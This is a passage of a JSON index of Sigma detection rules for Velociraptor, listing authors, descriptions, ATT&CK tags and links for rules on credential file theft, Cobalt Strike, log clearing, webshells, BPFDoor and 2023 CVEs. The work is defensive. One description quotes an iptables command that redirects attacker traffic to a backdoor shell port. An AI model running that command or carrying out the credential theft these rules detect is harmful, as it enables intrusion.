well-known filenames (sensitive files with credential data) copying", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_proc_creation_win_esentutl_sensitive_file_copy.yaml", "tags": ["attack.credential_access", "attack.t1003.002", "attack.t1003.003", "car.2013-07-001", "attack.s0404", "sysmon", "windows", "evtx"], "title": "Copying Sensitive Files with Credential Data"}, {"author": "Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali", "description": "Detects a suspicious copy command to or from an Admin share or remote", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\proc_creation_win_susp_copy_lateral_movement.yaml", "tags": ["attack.lateral_movement", "attack.collection", "attack.exfiltration", "attack.t1039", "attack.t1048", "attack.t1021.002", "windows", "evtx"], "title": "Copy from Admin Share"}, {"author": "Joseliyo Sanchez, @Joseliyo_Jstnk", "description": "Detects when the file \"passwd\" or \"shadow\" is copied from tmp path", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_cp_passwd_or_shadow_tmp.yaml", "tags": ["attack.credential_access", "attack.t1552.001", "os.linux"], "title": "Copy Passwd Or Shadow From TMP Path"}, {"author": "Seth Hanford", "description": "Detects potential container discovery via listing of certain kernel features in the \"/proc\" virtual filesystem", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_container_residence_discovery.yaml", "tags": ["attack.discovery", "attack.t1082", "os.linux"], "title": "Container Residence Discovery Via Proc Virtual FS"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal", "description": "Detects setting proxy configuration", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_proxy_connection.yaml", "tags": ["attack.defense_evasion", "attack.t1090", "os.linux"], "title": "Connection Proxy"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\network_connection\\net_connection_lnx_ngrok_tunnel.yaml", "tags": ["attack.exfiltration", "attack.command_and_control", "attack.t1567", "attack.t1568.002", "attack.t1572", "attack.t1090", "attack.t1102", "attack.s0508", "os.linux"], "title": "Communication To Ngrok Tunneling Service - Linux"}, {"author": "Max Altgelt (Nextron Systems)", "description": "Detects specific commands commonly used to remove or empty the syslog", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_clear_syslog.yaml", "tags": ["attack.impact", "attack.t1565.001", "os.linux"], "title": "Commands to Clear or Remove the Syslog - Builtin"}, {"author": "Max Altgelt (Nextron Systems), Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC", "description": "Detects specific commands commonly used to remove or empty the syslog. Which is often used by attacker as a method to hide their tracks", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_clear_syslog.yaml", "tags": ["attack.defense_evasion", "attack.t1070.002", "os.linux"], "title": "Commands to Clear or Remove the Syslog"}, {"author": "Christian Burkard (Nextron Systems)", "description": "Detects the ld.so preload persistence file. See `man ld.so` for more information.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_ldso_preload_injection.yaml", "tags": ["attack.persistence", "attack.privilege_escalation", "attack.t1574.006", "os.linux"], "title": "Code Injection by ld.so Preload"}, {"author": "Wojciech Lesicki", "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nWe can also catch this by system log 7045 (https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/win_cobaltstrike_service_installs.yml)\nIn some SIEM you can catch those events also in HKLM\\System\\ControlSet001\\Services or HKLM\\System\\ControlSet002\\Services, however, this rule is based on a regular sysmon's events.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\registry_set_cobaltstrike_service_installs.yaml", "tags": ["attack.execution", "attack.privilege_escalation", "attack.lateral_movement", "attack.t1021.002", "attack.t1543.003", "attack.t1569.002", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Service Installations in Registry"}, {"author": "Florian Roth (Nextron Systems), Wojciech Lesicki", "description": "Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\priv_esc\\win_security_cobaltstrike_service_installs.yaml", "tags": ["attack.execution", "attack.privilege_escalation", "attack.lateral_movement", "attack.t1021.002", "attack.t1543.003", "attack.t1569.002", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Service Installations - Security"}, {"author": "Florian Roth (Nextron Systems), Christian Burkard (Nextron Systems)", "description": "Detects the creation of a named pipe with a pattern found in CobaltStrike malleable C2 profiles", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\named_pipes\\pipe_created_hktl_cobaltstrike_susp_pipe_patterns.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Named Pipe Patterns"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the creation of a named pipe matching a pattern used by CobaltStrike Malleable C2 profiles", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\named_pipes\\pipe_created_hktl_cobaltstrike_re.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Named Pipe Pattern Regex"}, {"author": "Florian Roth (Nextron Systems), Wojciech Lesicki", "description": "Detects the creation of a named pipe as used by CobaltStrike", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\named_pipes\\pipe_created_hktl_cobaltstrike.yaml", "tags": ["attack.defense_evasion", "attack.privilege_escalation", "attack.t1055", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Named Pipe"}, {"author": "Wojciech Lesicki", "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\rundll\\proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "lolbas", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Load by Rundll32"}, {"author": "Wojciech Lesicki", "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\cobalt_strike\\rundll\\sysmon_proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yaml", "tags": ["attack.defense_evasion", "attack.t1218.011", "sysmon", "windows", "evtx", "cobalt_strike"], "title": "CobaltStrike Load by Rundll32"}, {"author": "Pawel Mazur, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC", "description": "Detects attempts to collect data stored in the clipboard from users with the usage of xclip tool. Xclip has to be installed.\nHighly recommended using rule on servers, due to high usage of clipboard utilities on user workstations.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_clipboard_collection.yaml", "tags": ["attack.collection", "attack.t1115", "os.linux"], "title": "Clipboard Collection with Xclip Tool"}, {"author": "\u00c3\u2013mer G\u00c3\u00bcnal, oscd.community", "description": "Detects attempts to clear logs on the system. Adversaries may clear system logs to hide evidence of an intrusion", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_clear_logs.yaml", "tags": ["attack.defense_evasion", "attack.t1070.002", "os.linux"], "title": "Clear Linux Logs"}, {"author": "Patrick Bareiss", "description": "Clear command history in linux which is used for defense evasion.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_shell_clear_cmd_history.yaml", "tags": ["attack.defense_evasion", "attack.t1070.003", "os.linux"], "title": "Clear Command History"}, {"author": "Florian Roth (Nextron Systems), MSTI (query)", "description": "Detects patterns found in process executions cause by China Chopper like tiny (ASPX) webshells", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\web_exploitation\\child_processes\\proc_creation_win_webshell_chopper.yaml", "tags": ["attack.persistence", "attack.t1505.003", "attack.t1018", "attack.t1033", "attack.t1087", "windows", "evtx", "webserver.iis"], "title": "Chopper Webshell Process Pattern"}, {"author": "Christopher Peacock @SecurePeacock, SCYTHE @scythe_io", "description": "Detects chmod targeting files in abnormal directory paths.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_susp_chmod_directories.yaml", "tags": ["attack.defense_evasion", "attack.t1222.002", "os.linux"], "title": "Chmod Suspicious Directory"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects the execution of a cat /etc/sudoers to list all users that have sudo rights", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_cat_sudoers.yaml", "tags": ["attack.reconnaissance", "attack.t1592.004", "os.linux"], "title": "Cat Sudoers"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of \"getcap\" binary. This is often used during recon activity to determine potential binaries that can be abused as GTFOBins or other.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_capa_discovery.yaml", "tags": ["attack.discovery", "attack.t1083", "os.linux"], "title": "Capabilities Discovery - Linux"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects exploitation activity of CVE-2023-46747 an unauthenticated remote code execution vulnerability in F5 BIG-IP.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-46747\\web_cve_2023_46747_f5_remote_code_execution.yaml", "tags": ["attack.initial_access", "attack.t1190", "detection.emerging_threats", "cve.2023.46747"], "title": "CVE-2023-46747 Exploitation Activity - Webserver"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects exploitation activity of CVE-2023-46747 an unauthenticated remote code execution vulnerability in F5 BIG-IP.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-46747\\proxy_cve_2023_46747_f5_remote_code_execution.yaml", "tags": ["attack.initial_access", "attack.t1190", "detection.emerging_threats", "cve.2023.46747"], "title": "CVE-2023-46747 Exploitation Activity - Proxy"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects a crash of \"WinRAR.exe\" where the version is lower than 6.23. This could indicate potential exploitation of CVE-2023-40477", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-40477\\win_application_exploit_cve_2023_40477_winrar_crash.yaml", "tags": ["attack.execution", "cve.2023.40477", "detection.emerging_threats"], "title": "CVE-2023-40477 Potential Exploitation - WinRAR Application Crash"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of \".rev\" files by WinRAR. Could be indicative of potential exploitation of CVE-2023-40477. Look for a suspicious execution shortly after creation or a WinRAR application crash.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-40477\\file_event_win_exploit_cve_2023_40477_winrar_rev_file_abuse.yaml", "tags": ["attack.execution", "cve.2023.40477", "detection.emerging_threats"], "title": "CVE-2023-40477 Potential Exploitation - .REV File Creation"}, {"author": "Nasreddine Bencherchali (Nextron Systems), Andreas Braathen (mnemonic.io)", "description": "Detects exploitation attempt of CVE-2023-38331 (WinRAR before v6.23), where an attacker can leverage WinRAR to execute arbitrary commands and binaries.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-38831\\proc_creation_win_exploit_cve_2023_38831_winrar_child_proc.yaml", "tags": ["detection.emerging_threats", "attack.execution", "attack.t1203", "cve.2023.38331"], "title": "CVE-2023-38331 Exploitation Attempt - Suspicious WinRAR Child Process"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a file with a double extension and a space by WinRAR. This could be a sign of exploitation of CVE-2023-38331", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-38831\\file_event_win_exploit_cve_2023_38331_winrar_susp_double_ext.yaml", "tags": ["attack.execution", "cve.2023.38331", "detection.emerging_threats"], "title": "CVE-2023-38331 Exploitation Attempt - Suspicious Double Extension File"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g. create admin accounts and execute arbitrary commands.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-22518\\web_exploit_cve_2023_22518_confluence_auth_bypass.yaml", "tags": ["detection.emerging_threats", "attack.initial_access", "attack.t1190", "cve.2023.22518"], "title": "CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Webserver)"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g. create admin accounts and execute arbitrary commands.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proxy_exploit_cve_2023_22518_confluence_auth_bypass.yaml", "tags": ["detection.emerging_threats", "attack.initial_access", "attack.t1190", "cve.2023.22518"], "title": "CVE-2023-22518 Exploitation Attempt - Vulnerable Endpoint Connection (Proxy)"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g. create admin accounts and execute arbitrary commands.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proc_creation_win_exploit_cve_2023_22518_confluence_tomcat_child_proc.yaml", "tags": ["detection.emerging_threats", "attack.execution", "attack.t1059", "attack.initial_access", "attack.t1190", "cve.2023.22518"], "title": "CVE-2023-22518 Exploitation Attempt - Suspicious Confluence Child Process (Windows)"}, {"author": "Andreas Braathen (mnemonic.io)", "description": "Detects exploitation attempt of CVE-2023-22518 (Confluence Data Center / Confluence Server), where an attacker can exploit vulnerable endpoints to e.g. create admin accounts and execute arbitrary commands.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\emerging-threats\\2023\\Exploits\\CVE-2023-22518\\proc_creation_lnx_exploit_cve_2023_22518_confluence_java_child_proc.yaml", "tags": ["detection.emerging_threats", "attack.execution", "attack.t1059", "attack.initial_access", "attack.t1190", "cve.2023.22518"], "title": "CVE-2023-22518 Exploitation Attempt - Suspicious Confluence Child Process (Linux)"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects the creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_service_persistence_evtx.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel", "evtx"], "title": "COLDSTEEL RAT Service Persistence Execution - EVTX"}, {"author": "X__Junior (Nextron Systems)", "description": "Detects the creation of an \"svchost\" process with specific command line flags, that were seen present and used by ColdSteel RAT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_service_persistence.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel"], "title": "COLDSTEEL RAT Service Persistence Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a \"rundll32\" process from the ColdSteel persistence service to initiate the cleanup command by calling one of its own exports. This functionality is not present in \"MileStone2017\" and some \"MileStone2016\" samples", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_cleanup_evtx.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel", "evtx"], "title": "COLDSTEEL RAT Cleanup Command Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a \"rundll32\" process from the ColdSteel persistence service to initiate the cleanup command by calling one of its own exports. This functionality is not present in \"MileStone2017\" and some \"MileStone2016\" samples", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_cleanup.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel"], "title": "COLDSTEEL RAT Cleanup Command Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a process executing as user called \"ANONYMOUS\" seen used by the \"MileStone2016\" variant of COLDSTEEL", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_anonymous_process_evtx.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel", "evtx"], "title": "COLDSTEEL RAT Anonymous User Process Execution - EVTX"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a process executing as user called \"ANONYMOUS\" seen used by the \"MileStone2016\" variant of COLDSTEEL", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_anonymous_process_eoe.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel"], "title": "COLDSTEEL RAT Anonymous User Process Execution - EOE"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of a process executing as user called \"ANONYMOUS\" seen used by the \"MileStone2016\" variant of COLDSTEEL", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\proc_creation_win_malware_coldsteel_anonymous_process.yaml", "tags": ["attack.persistence", "attack.defense_evasion", "detection.emerging_threats", "windows", "malware.coldsteel"], "title": "COLDSTEEL RAT Anonymous User Process Execution"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects the creation of new services potentially related to COLDSTEEL RAT", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\malware\\COLDSTEEL\\win_system_malware_coldsteel_persistence_service.yaml", "tags": ["attack.defense_evasion", "attack.persistence", "detection.emerging_threats"], "title": "COLDSTEEL Persistence Service Creation"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects buffer overflow attempts in Unix system log files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\builtin\\lnx_buffer_overflows.yaml", "tags": ["attack.t1068", "attack.privilege_escalation", "os.linux"], "title": "Buffer Overflow Attempts"}, {"author": "Rafal Piasecki", "description": "All TCP traffic on particular port from attacker is routed to different port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22 -j REDIRECT --to-ports 42392'\nThe traffic looks like encrypted SSH communications going to TCP port 22, but in reality is being directed to the shell port once it hits the iptables rule for the attacker host only.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\malware\\bpfdoor\\lnx_auditd_bpfdoor_port_redirect.yaml", "tags": ["attack.defense_evasion", "attack.t1562.004", "os.linux", "bpfdoor"], "title": "Bpfdoor TCP Ports Redirect"}, {"author": "Igor Fits, oscd.community", "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware.\nThis rule detect using dd and truncate to add a junk data to file.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_binary_padding.yaml", "tags": ["attack.defense_evasion", "attack.t1027.001", "os.linux"], "title": "Binary Padding - Linux"}, {"author": "@d4ns4n_", "description": "Detects execution of the bash shell with the interactive flag \"-i\".", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_bash_interactive_shell.yaml", "tags": ["attack.execution", "os.linux"], "title": "Bash Interactive Shell"}, {"author": "ok @securonix invrep_de, oscd.community", "description": "focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including\nCobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads\nthat often undergo minimal changes by attackers due to bad opsec.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\powershell\\posh_pm_bad_opsec_artifacts.yaml", "tags": ["attack.execution", "attack.t1059.001", "windows", "evtx", "powershell", "generic"], "title": "Bad Opsec Powershell Code Artifacts"}, {"author": "Andreas Hunkeler (@Karneades)", "description": "Detects the usage of the unsafe bpftrace option", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\malware\\bpfdoor\\proc_creation_lnx_bpftrace_unsafe_option_usage.yaml", "tags": ["attack.execution", "attack.t1059.004", "os.linux"], "title": "BPFtrace Unsafe Option Usage"}, {"author": "Rafal Piasecki", "description": "detects BPFDoor .lock and .pid files access in temporary file storage facility", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\malware\\bpfdoor\\lnx_auditd_bpfdoor_file_accessed.yaml", "tags": ["attack.execution", "attack.t1106", "attack.t1059", "os.linux"], "title": "BPFDoor Abnormal Process ID or Lock File Accessed"}, {"author": "Mikhail Larin, oscd.community", "description": "Detect changes in auditd configuration files", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\auditd\\lnx_auditd_auditing_config_change.yaml", "tags": ["attack.defense_evasion", "attack.t1562.006", "os.linux"], "title": "Auditing Configuration Changes on Linux Host"}, {"author": "Florian Roth (Nextron Systems), Zach Mathis", "description": "Detects events generated by user-mode applications when they call the CveEventWrite API when a known vulnerability is trying to be exploited.\nMS started using this log in Jan. 2020 with CVE-2020-0601 (a Windows CryptoAPI vulnerability.\nUnfortunately, that is about the only instance of CVEs being written to this log.\n", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\tampering\\evtx\\win_audit_cve.yaml", "tags": ["attack.execution", "attack.t1203", "attack.privilege_escalation", "attack.t1068", "attack.defense_evasion", "attack.t1211", "attack.credential_access", "attack.t1212", "attack.lateral_movement", "attack.t1210", "attack.impact", "attack.t1499.004", "windows", "evtx", "event_logging"], "title": "Audit CVE Event"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2022-26134", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_cve_2022_26134_atlassian_confluence.yaml", "tags": ["attack.initial_access", "attack.execution", "attack.t1190", "attack.t1059", "cve.2022.26134", "os.linux"], "title": "Atlassian Confluence CVE-2022-26134"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects usage of \"apt\" and \"apt-get\" as a GTFOBin to execute and proxy command and binary execution", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_gtfobin_apt.yaml", "tags": ["attack.discovery", "attack.t1083", "os.linux"], "title": "Apt GTFOBin Abuse - Linux"}, {"author": "Nasreddine Bencherchali (Nextron Systems)", "description": "Detects attempts to exploit an apache spark server via CVE-2014-6287 from a commandline perspective", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\linux\\generic\\process_creation\\proc_creation_lnx_cve_2022_33891_spark_shell_command_injection.yaml", "tags": ["attack.initial_access", "attack.t1190", "cve.2022.33891", "os.linux"], "title": "Apache Spark Shell Command Injection - ProcessCreation"}, {"author": "Florian Roth (Nextron Systems), Arnim Rupp", "description": "Detects a highly relevant Antivirus alert that reports a web shell. It's highly recommended to tune this rule to the specific strings used by your anti virus solution by downloading a big webshell repo from e.g. github and checking the matches.", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_webshell.yaml", "tags": ["attack.persistence", "attack.t1505.003", "windows", "windows.evtx", "antivirus"], "title": "Antivirus Web Shell Detection"}, {"author": "Florian Roth (Nextron Systems), Arnim Rupp", "description": "Detects an Antivirus alert in a highly relevant file path or with a relevant file name", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_relevant_files.yaml", "tags": ["attack.resource_development", "attack.t1588", "windows", "windows.evtx", "antivirus"], "title": "Antivirus Relevant File Paths Alerts"}, {"author": "Florian Roth (Nextron Systems), Arnim Rupp", "description": "Detects a highly relevant Antivirus alert that reports ransomware", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_ransomware.yaml", "tags": ["attack.t1486", "windows", "windows.evtx", "antivirus"], "title": "Antivirus Ransomware Detection"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects a highly relevant Antivirus alert that reports a password dumper", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_password_dumper.yaml", "tags": ["attack.credential_access", "attack.t1003", "attack.t1558", "attack.t1003.001", "attack.t1003.002", "windows", "windows.evtx", "antivirus"], "title": "Antivirus Password Dumper Detection"}, {"author": "Florian Roth (Nextron Systems), Arnim Rupp", "description": "Detects a highly relevant Antivirus alert that reports a hack tool or other attack tool", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_hacktool.yaml", "tags": ["attack.execution", "attack.t1204", "windows", "windows.evtx", "antivirus"], "title": "Antivirus Hacktool Detection"}, {"author": "Florian Roth (Nextron Systems), Arnim Rupp", "description": "Detects a highly relevant Antivirus alert that reports an exploitation framework", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\antivirus\\windows_defender\\windows_defender_exploiting.yaml", "tags": ["attack.execution", "attack.t1203", "attack.command_and_control", "attack.t1219", "windows", "windows.evtx", "antivirus"], "title": "Antivirus Exploitation Framework Detection"}, {"author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)", "description": "Detects suspicious command line that adds an account to the local administrators/administrateurs group", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\generic\\common_commands\\proc_creation_win_susp_add_user_local_admin_group.yaml", "tags": ["attack.persistence", "attack.t1098", "windows", "evtx", "generic"], "title": "Add User to Local Administrators Group"}, {"author": "Florian Roth (Nextron Systems), Michael Haag", "description": "Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\sysmon_win_susp_vssadmin_ntds_activity.yaml", "tags": ["attack.credential_access", "attack.t1003", "sysmon"], "title": "Activity Related to NTDS.dit Domain Hash Retrieval"}, {"author": "Florian Roth (Nextron Systems), Michael Haag", "description": "Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\ntds_dit\\win_susp_vssadmin_ntds_activity.yaml", "tags": ["attack.credential_access", "attack.t1003", "windows", "evtx"], "title": "Activity Related to NTDS.dit Domain Hash Retrieval"}, {"author": "Florian Roth (Nextron Systems)", "description": "Detects access to $ADMIN share", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\lateral_movement\\smb\\win_security_admin_share_access.yaml", "tags": ["attack.lateral_movement", "attack.t1021.002", "windows", "evtx"], "title": "Access to ADMIN$ Share"}, {"author": "Semanur Guneysu @semanurtg, oscd.community", "description": "Detection of unusual child processes by different system processes", "link": "https://github.com/Velocidex/velociraptor-sigma-rules/blob/master/rules\\windows\\privilege_escalation\\proc_creation_win_susp_abusing_debug_privilege.yaml", "tags": ["attack.privilege_escalation", "attack.t1548"], "title": "Abused Debug Privilege by Arbitrary Parent Processes"}]